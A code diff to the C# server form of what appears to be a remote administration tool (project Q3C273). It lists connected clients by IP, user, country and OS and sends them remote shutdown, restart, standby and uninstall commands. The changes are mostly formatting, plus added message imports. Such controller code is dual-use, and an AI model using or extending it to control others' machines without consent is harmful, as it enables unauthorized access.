@@ -5,6 +5,10 @@ using Q3C273.Server.Networking;
 using Q3C273.Server.Utilities;
 using Q3C273.Shared.Enums;
 using Q3C273.Shared.Messages;
+using Q3C273.Shared.Messages.ClientServices;
+using Q3C273.Shared.Messages.MessageBox;
+using Q3C273.Shared.Messages.Shutdown;
+using Q3C273.Shared.Messages.WebsiteVisitor;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -59,11 +63,12 @@ namespace Q3C273.Server.Forms
 
         public void UpdateWindowTitle()
         {
-            if (_titleUpdateRunning) return;
+            if (_titleUpdateRunning)
+                return;
             _titleUpdateRunning = true;
             try
             {
-                this.Invoke((MethodInvoker) delegate
+                this.Invoke((MethodInvoker)delegate
                 {
                     int selected = lstClients.SelectedItems.Count;
                     this.Text = (selected > 0)
@@ -172,7 +177,7 @@ namespace Q3C273.Server.Forms
         {
             try
             {
-                this.Invoke((MethodInvoker) delegate
+                this.Invoke((MethodInvoker)delegate
                 {
                     if (!listening)
                         lstClients.Items.Clear();
@@ -189,7 +194,8 @@ namespace Q3C273.Server.Forms
         {
             lock (_clientConnections)
             {
-                if (!ListenServer.Listening) return;
+                if (!ListenServer.Listening)
+                    return;
                 _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
             }
 
@@ -207,7 +213,8 @@ namespace Q3C273.Server.Forms
         {
             lock (_clientConnections)
             {
-                if (!ListenServer.Listening) return;
+                if (!ListenServer.Listening)
+                    return;
                 _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
             }
 
@@ -269,11 +276,12 @@ namespace Q3C273.Server.Forms
         /// <param name="text">The new tooltip text.</param>
         public void SetToolTipText(Client client, string text)
         {
-            if (client == null) return;
+            if (client == null)
+                return;
 
             try
             {
-                lstClients.Invoke((MethodInvoker) delegate
+                lstClients.Invoke((MethodInvoker)delegate
                 {
                     var item = GetListViewItemByClient(client);
                     if (item != null)
@@ -291,7 +299,8 @@ namespace Q3C273.Server.Forms
         /// <param name="client">The client to add.</param>
         private void AddClientToListview(Client client)
         {
-            if (client == null) return;
+            if (client == null)
+                return;
 
             try
             {
@@ -301,9 +310,10 @@ namespace Q3C273.Server.Forms
                     " " + client.EndPoint.Address, client.Value.Tag,
                     client.Value.UserAtPc, client.Value.Version, "Connected", "Active", client.Value.CountryWithCode,
                     client.Value.OperatingSystem, client.Value.AccountType
-                }) { Tag = client, ImageIndex = client.Value.ImageIndex };
+                })
+                { Tag = client, ImageIndex = client.Value.ImageIndex };
 
-                lstClients.Invoke((MethodInvoker) delegate
+                lstClients.Invoke((MethodInvoker)delegate
                 {
                     lock (_lockClients)
                     {
@@ -324,11 +334,12 @@ namespace Q3C273.Server.Forms
         /// <param name="client">The client to remove.</param>
         private void RemoveClientFromListview(Client client)
         {
-            if (client == null) return;
+            if (client == null)
+                return;
 
             try
             {
-                lstClients.Invoke((MethodInvoker) delegate
+                lstClients.Invoke((MethodInvoker)delegate
                 {
                     lock (_lockClients)
                     {
@@ -381,11 +392,12 @@ namespace Q3C273.Server.Forms
         /// <returns>Listview item of the client.</returns>
         private ListViewItem GetListViewItemByClient(Client client)
         {
-            if (client == null) return null;
+            if (client == null)
+                return null;
 
             ListViewItem itemClient = null;
 
-            lstClients.Invoke((MethodInvoker) delegate
+            lstClients.Invoke((MethodInvoker)delegate
             {
                 itemClient = lstClients.Items.Cast<ListViewItem>()
                     .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
@@ -406,7 +418,8 @@ namespace Q3C273.Server.Forms
             {
                 lock (_lockClients)
                 {
-                    if (lstClients.SelectedItems.Count == 0) return;
+                    if (lstClients.SelectedItems.Count == 0)
+                        return;
                     clients.AddRange(
                         lstClients.SelectedItems.Cast<ListViewItem>()
                             .Where(lvi => lvi != null)
@@ -436,8 +449,9 @@ namespace Q3C273.Server.Forms
             {
                 this.Invoke((MethodInvoker)delegate
                 {
-                    if (c == null || c.Value == null) return;
-                    
+                    if (c == null || c.Value == null)
+                        return;
+
                     notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                         string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                         c.Value.OperatingSystem), ToolTipIcon.Info);
@@ -488,7 +502,8 @@ namespace Q3C273.Server.Forms
 
         private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count == 0) return;
+            if (lstClients.SelectedItems.Count == 0)
+                return;
             if (
                 MessageBox.Show(
                     string.Format(
@@ -614,7 +629,7 @@ namespace Q3C273.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction {Action = ShutdownAction.Shutdown});
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
             }
         }
 
@@ -622,7 +637,7 @@ namespace Q3C273.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction {Action = ShutdownAction.Restart});
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
             }
         }
 
@@ -630,7 +645,7 @@ namespace Q3C273.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction {Action = ShutdownAction.Standby});
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
             }
         }
 
